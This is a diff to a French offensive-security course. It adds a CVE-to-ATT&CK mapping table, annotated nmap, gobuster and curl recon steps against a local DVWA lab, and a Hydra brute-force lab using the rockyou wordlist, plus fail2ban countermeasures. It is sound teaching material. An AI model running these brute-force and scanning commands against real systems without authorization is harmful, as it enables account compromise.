@@ -188,6 +188,19 @@ Ce chapitre couvre la matrice ATT&CK (14 tactiques, 200+ techniques), le mapping
 
 **Fig 3** — Mapping des attaques classiques (Phishing, DDoS, SQLi, XSS, CSRF) vers leurs techniques et tactiques MITRE ATT&CK.
 
+### Correspondance CVE → ATT&CK
+
+Les **CVE** (Common Vulnerabilities and Exposures) identifient une vulnérabilité spécifique dans un logiciel. Les **techniques ATT&CK** décrivent la méthode utilisée pour l'exploiter. Les deux sont complémentaires :
+
+| CVE | Vulnérabilité | Technique ATT&CK | Lab |
+|-----|---------------|------------------|-----|
+| CVE-2011-2523 | vsftpd 2.3.4 — backdoor (supply chain) | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App | J2 Lab 2.2 |
+| CVE-2007-2447 | Samba 3.0.20 — command injection (usermap) | [T1210](https://attack.mitre.org/techniques/T1210/) Exploit Remote Services | J2 Lab 2.3 |
+| CVE-2017-0144 | EternalBlue — buffer overflow SMB | [T1210](https://attack.mitre.org/techniques/T1210/) Exploit Remote Services | J1 Exercice 2 |
+| *(aucune)* | XSS, SQLi, CSRF, CMDi (vulnérabilités génériques) | [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1203](https://attack.mitre.org/techniques/T1203/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | J1 Labs 1.2-1.5 |
+
+> **Note :** Les failles web (XSS, SQLi) n'ont pas de CVE unique car elles dépendent de l'implémentation. En revanche, les vulnérabilités logicielles (vsftpd, Samba) ont une CVE bien spécifique qui permet de les tracer et de les corriger via un système de patch management (M1051).
+
 ---
 
 ## 2. Profils d'attaquants
@@ -316,39 +329,43 @@ Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. 
 
 ```bash
 cd ~/cours-hacking/jour-1/labs
-# Scan nmap : détection de version (-sV) sur le port DVWA (-p 8088), sortie sauvegardée dans un fichier avec tee (affiche ET écrit)
+# 📌 Scan nmap du port DVWA : détection de version du service web
+# 🔍 -sV = probe les bannières pour identifier la version précise du service
+# 🔍 -p 8088 = port cible, tee = affiche la sortie ET la sauvegarde dans un fichier
 nmap -sV -p 8088 localhost | tee nmap_dvwa.txt
-# PORT     STATE SERVICE VERSION
-# 8088/tcp open  http    Apache httpd 2.4.X  (confirme le service web Apache sur le port attendu)
+# → PORT 8088/tcp open http Apache httpd 2.4.X  (service web Apache confirmé)
 ```
 
 ### Étape 2 — Énumération gobuster
 
 ```bash
-# Toujours dans ~/cours-hacking/jour-1/labs/
 cd ~/cours-hacking/jour-1/labs
-# Énumération de répertoires web avec gobuster : mode dir, url cible (-u), wordlist de noms communs (-w), mode silencieux (-q sans bannière)
+# 📌 Énumération des répertoires web cachés avec gobuster
+# 🔍 dir = mode scan de répertoires, -u = URL cible, -w = wordlist de noms communs
+# 🔍 -q = mode silencieux (masque la bannière), | tee = affiche + sauvegarde
 gobuster dir -u http://localhost:8088 \
   -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
-# /login.php (Status: 200)         → page de connexion accessible
-# /vulnerabilities (Status: 301)   → répertoire des pages vulnérables (redirection)
-# /config (Status: 301)            → répertoire de configuration (potentiellement sensible)
+# → /login.php (200)        page de connexion accessible
+# → /vulnerabilities (301)  répertoire des pages vulnérables
+# → /config (301)           répertoire de configuration (potentiellement sensible)
 ```
 
 ### Étape 3 — Connexion DVWA
 
 ```bash
-# Connexion à DVWA : -s = silencieux, -c = sauvegarde le cookie de session dans un fichier, -d = données POST (formulaire)
-# grep -o extrait soit "Welcome" (succès) soit "Login failed" (échec) pour valider le login admin/password
+# 📌 Connexion à DVWA via le formulaire d'authentification admin/password
+# 🔍 -s = silencieux (pas de barre de progression), -c = sauvegarde le cookie dans un fichier
+# 🔍 -d = données POST (username=admin&password=password&Login=Login)
+# 🔍 grep -o extrait "Welcome" (succès) ou "Login failed" (échec) pour validation
 curl -s -c /tmp/dvwa_cookie.txt \
   -d "username=admin&password=password&Login=Login" \
   "http://localhost:8088/login.php" | grep -o "Welcome\|Login failed"
-# → Welcome  (authentification réussie, le cookie est stocké dans /tmp/dvwa_cookie.txt)
+# → Welcome  (authentification réussie, cookie stocké dans /tmp/dvwa_cookie.txt)
 
+# 📌 Définir le niveau de sécurité sur "low" (obligatoire pour les labs)
 # Firefox : http://localhost:8088 → DVWA Security → low
-
-# Alternative sans navigateur : définir le niveau de sécurité directement via curl
-# -b lit le cookie d'authentification, -c met à jour le fichier avec le nouveau cookie security=low
+# Alternative sans navigateur :
+# 🔍 -b = envoie le cookie d'auth, -c = met à jour le fichier avec le nouveau cookie security=low
 curl -s -b /tmp/dvwa_cookie.txt -c /tmp/dvwa_cookie.txt \
   -d "security=low&seclev_submit=Submit" \
   "http://localhost:8088/security.php"
@@ -911,6 +928,148 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 
 ---
 
+## Lab 1.6 — Attaque par force brute avec Hydra
+
+###  Fiche
+
+| Durée | Conteneur | Dossier | Technique ATT&CK |
+|---|---|---|---|
+| 45 min | dvwa (port 8088) | `~/cours-hacking/jour-1/labs/` | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
+
+### Contexte métier
+
+40% des incidents de cybersécurité impliquent des identifiants faibles ou volés (Verizon DBIR 2024). Dans un test de pénétration, l'auditeur teste systématiquement la robustesse des mots de passe contre une attaque par dictionnaire. **Hydra** est l'outil de référence pour automatiser ces tests — utilisé par les pentesters comme par les équipes SOC pour auditer leurs propres annuaires.
+
+**Fonctionnement :** Hydra essaie des couples `login:password` contre un service (HTTP, SSH, FTP...) jusqu'à trouver une correspondance. Le taux de réussite dépend de la qualité de la wordlist.
+
+### Prérequis
+
+```bash
+cd ~/cours-hacking/jour-1/labs
+# Vérifier que le cookie jar DVWA est toujours valide
+curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost:8088/login.php"
+# → 200  (la session est active, on peut travailler)
+```
+
+### Étape 1 — Inspecter le formulaire cible
+
+Avant de lancer Hydra, il faut comprendre la structure du formulaire : méthode HTTP, noms des champs, message d'échec.
+
+```bash
+cd ~/cours-hacking/jour-1/labs
+
+# 📌 Récupérer le HTML de la page de login pour identifier les noms des champs
+# 🔍 curl -s = mode silencieux, -b = envoie le cookie de session
+# 🔍 grep -o 'name="[^"]*"' = extrait chaque attribut name (le motif [^"]* capture tout sauf ")
+curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/login.php" \
+  | grep -o 'name="[^"]*"'
+# → name="username"  name="password"  name="Login"  (3 champs du formulaire)
+
+# 📌 Identifier le message d'échec : soumettre un mauvais password et capturer l'erreur
+# 🔍 grep -oi = insensible à la casse (-i), affiche uniquement la correspondance (-o)
+curl -s -b /tmp/dvwa_cookie.txt \
+  -d "username=admin&password=mauvais&Login=Login" \
+  "http://localhost:8088/login.php" | grep -oi "login failed\|failed"
+# → Login failed  (c'est le marqueur d'échec F= qu'Hydra utilisera)
+```
+
+### Étape 2 — Lancer Hydra
+
+```bash
+cd ~/cours-hacking/jour-1/labs
+
+# 📌 Hydra teste le login admin contre la wordlist rockyou.txt
+# 🔍 -l admin = login unique (-l = single login, -L = fichier de logins)
+# 🔍 -P = chemin vers la wordlist (rockyou.txt = 14 millions de mots de passe)
+# 🔍 http-post-form = module HTTP POST, la chaîne contient 3 parties séparées par :
+#   1. "/login.php" = URL du formulaire
+#   2. "username=^USER^&password=^PASS^&Login=Login" = champs avec variables
+#      ^USER^ et ^PASS^ = remplacés par Hydra à chaque tentative
+#   3. "Login failed" = chaîne F= (Fail) détectée dans la réponse pour un échec
+# 🔍 -V = verbeux (affiche chaque tentative), | tee = sauvegarde la sortie
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  localhost http-post-form \
+  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V 2>&1 \
+  | tee hydra_dvwa.txt
+```
+
+Sortie attendue :
+
+```console
+[80][http-post-form] host: localhost   login: admin   password: password
+[STATUS] attack finished for localhost (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+```
+
+**Checkpoint :** Hydra a trouvé `password` comme mot de passe admin. En 10 secondes, un mot de passe trivial est compromis.
+
+### Étape 3 — Test multi-logins
+
+```bash
+# 📌 Test avec une liste de logins (plus réaliste) : -L = fichier de logins
+# Créer une mini wordlist de logins courants
+echo -e "admin\ntest\nroot\nuser\nadministrateur" > /tmp/logins.txt
+
+# 🔍 -L = fichier contenant plusieurs logins à tester
+# 🔍 -P = wordlist de mots de passe (rockyou.txt)
+# 🔍 -F = s'arrêter au premier couple valide trouvé (exit on first find)
+hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
+  localhost http-post-form \
+  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -F 2>&1 \
+  | tee hydra_multi.txt
+```
+
+Sortie attendue :
+
+```console
+[80][http-post-form] host: localhost   login: admin   password: password
+[STATUS] attack finished for localhost (valid pair found)
+```
+
+**Checkpoint :** Quel que soit le login testé, Hydra trouve le couple valide `admin:password`. Le mot de passe est le maillon faible.
+
+### 🔒 Contre-mesure (M1036 Account Lockout + M1027 Password Policies)
+
+| Attaque | Défense active | Code de correction |
+|---------|----------------|-------------------|
+| Brute-force HTTP | **fail2ban** : bannir l'IP après N échecs | `maxretry=5, findtime=600, bantime=900` |
+| Wordlist courante | **Politique de mots de passe** | Longueur minimale 12 + complexité (pam_pwquality) |
+| Identifiants par défaut | **Changement obligatoire au premier login** | `chage -d 0 <user>` force le changement au prochain login |
+| Auth sans limite | **Rate limiting applicatif** | `sleep(1)` après chaque échec, compteur en session |
+
+```bash
+# 📌 Installer fail2ban sur le conteneur DVWA
+# fail2ban = framework de banissement automatique qui scrute les logs Apache
+docker exec dvwa-target bash -c "apt-get update && apt-get install -y fail2ban"
+
+# 📌 Créer une règle fail2ban pour le login DVWA
+# 🔍 maxretry = 5 échecs autorisés, findtime = 600s (fenêtre de 10 min)
+# 🔍 bantime = 900s (15 min de bannissement)
+docker exec dvwa-target bash -c "cat > /etc/fail2ban/jail.local << 'EOF'
+[apache-dvwa]
+enabled  = true
+port     = http,https
+filter   = apache-auth
+logpath  = /var/log/apache2/error.log
+maxretry = 5
+findtime = 600
+bantime  = 900
+EOF
+fail2ban-client reload"
+
+# Vérification : la règle est active
+docker exec dvwa-target bash -c "fail2ban-client status apache-dvwa"
+# → Status for the jail: apache-dvwa  |  Currently banned: 0  (prêt à bloquer)
+
+# 📌 Re-tester Hydra après fail2ban : après 5 échecs, l'IP est bannie
+# hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" 2>&1 | head -5
+# → [ERROR] target localhost:80 - connection refused!  (l'IP est bannie)
+```
+
+> **Checkpoint défensif :** Avec fail2ban actif, Hydra ne peut plus tester que 5 mots de passe avant le banissement temporaire. Le brute-force est neutralisé à l'échelle réseau.
+
+---
+
 ## Exercices
 
 ### Exercice 1 : Couche ATT&CK Navigator
@@ -928,7 +1087,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 **Énoncé :** WannaCry (2017) utilisait EternalBlue. Quelles techniques ATT&CK ?
 
 <details><summary><strong>Solution</strong></summary>
-- EternalBlue → [T1210](https://attack.mitre.org/techniques/T1210/) ([TA0008](https://attack.mitre.org/tactics/TA0008/)), DoublePulsar → [T1543.003](https://attack.mitre.org/techniques/T1543/003/) ([TA0003](https://attack.mitre.org/tactics/TA0003/)), Chiffrement → [T1486](https://attack.mitre.org/techniques/T1486/) ([TA0014](https://attack.mitre.org/tactics/TA0014/))
+- EternalBlue (CVE-2017-0144) → [T1210](https://attack.mitre.org/techniques/T1210/) ([TA0008](https://attack.mitre.org/tactics/TA0008/)), DoublePulsar → [T1543.003](https://attack.mitre.org/techniques/T1543/003/) ([TA0003](https://attack.mitre.org/tactics/TA0003/)), Chiffrement → [T1486](https://attack.mitre.org/techniques/T1486/) ([TA0014](https://attack.mitre.org/tactics/TA0014/))
 </details>
 
 ### Exercice 3 : Mini-rapport DVWA
@@ -971,6 +1130,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 - [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [DVWA GitHub](https://github.com/digininja/DVWA)
+- TryHackMe : [Jr Penetration Tester Path](https://tryhackme.com/path/jr-penetration-tester) — room [DVWA](https://tryhackme.com/room/dvwa)
 
 ---
 
